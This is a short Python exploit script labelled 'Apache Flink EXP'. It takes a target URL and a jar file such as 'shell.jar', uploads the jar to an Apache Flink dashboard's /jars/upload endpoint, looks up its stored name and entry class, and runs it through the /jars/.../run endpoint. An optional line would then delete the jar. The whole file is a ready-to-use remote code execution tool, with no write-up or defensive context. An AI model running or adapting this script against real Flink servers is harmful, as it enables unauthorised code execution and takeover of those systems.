#!/usr/bin/python
#auther by 0cke3t

import requests
import json
import sys
import os

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
"Accept": "application/json, text/plain, */*"
}

#proxies = {"http":"http://127.0.0.1:8080"}

def Str2Json(Rawdata):
    return json.loads(Rawdata)


def getHahName(Jsondata):
    hashname = Jsondata["filename"]
    hashname = hashname.split("/")[-1]
    return hashname


def getClass(url):
    res = requests.get(url + "/jars", headers = headers)
    Json = Str2Json(res.text)
    return Json['files'][0]['entry'][0]['name']

def postJar(url, file):
    files = {
    "field" : ("s0cke3t.jar", open(file, "rb"), "application/octet-stream")
    }
    res = requests.post(url + "/jars/upload", files=files, headers = headers)
    return res.text

def delJar(url, fname):
    requests.delete(url+"/jars/"+fname)

def submitJar(url, hname, cname):
    datas = {
        "entryClass":cname,
        "parallelism":None,
        "programArgs":None,
        "savepointPath":None,
        "allowNonRestoredState":None
        }    
    res = requests.post(url + "/jars/" + hname + "/run?entry-class=" + cname, data = json.dumps(datas), headers = headers)
    print(res.text)

def Exploit(Target, Jarfile):
    res = postJar(Target, Jarfile)
    Json = Str2Json(res)
    hashName = getHahName(Json)
    print("Hashname: "+hashName)
    className = getClass(Target)
    print("Classname: "+className)
    submitJar(Target, hashName, className)
    #optional
    #delJar(Target, hashName)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("========== Apache Flink EXP ==========\r\n")
        print("usage: "+str(sys.argv[0][sys.argv[0].rfind(os.sep) + 1:])+"  http://www.example.com:8081  shell.jar\r\n")
        print("========== Auther By S0cke3t ==========")
        exit()
    Exploit(sys.argv[1],sys.argv[2])